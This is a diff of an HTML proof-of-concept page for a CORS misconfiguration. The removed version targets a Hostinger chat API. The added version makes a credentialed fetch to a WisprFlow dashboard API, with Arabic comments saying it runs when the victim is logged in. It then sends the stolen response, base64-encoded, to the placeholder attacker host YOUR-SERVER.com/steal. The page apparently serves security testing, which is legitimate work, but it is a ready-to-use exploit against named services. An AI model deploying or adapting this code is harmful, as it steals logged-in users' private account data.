@@ -1,22 +1,21 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CORS PoC</title>
-</head>
 <body>
-  <h2>Testing API Response...</h2>
+<script>
+// هذا يعمل فقط عندما الضحية مسجّل الدخول
+// والمتصفح عنده JWT مخزّن في cookies/session
 
-  <script>
-   fetch("https://agents.hostinger.com/api/message-hub/api/v1/chat/respond", {
-  method: "POST",
-  credentials: "include",
-  headers: {"Content-Type":"application/json"},
-  body: JSON.stringify({message:"test"})
+fetch("https://platform-api.wisprflow.ai/api/v1/dash/client_api", {
+  credentials: "include"  // ← هذا يرسل cookies/JWT تلقائياً
 })
 .then(r => r.text())
-.then(console.log)
-
-    test();
-  </script>
+.then(data => {
+  // إظهار البيانات
+  document.body.innerHTML = `<pre>${data}</pre>`;
+  
+  // إرسال البيانات إلى سيرفر المهاجم
+  fetch("https://YOUR-SERVER.com/steal?data=" + btoa(data));
+});
+</script>
 </body>
 </html>
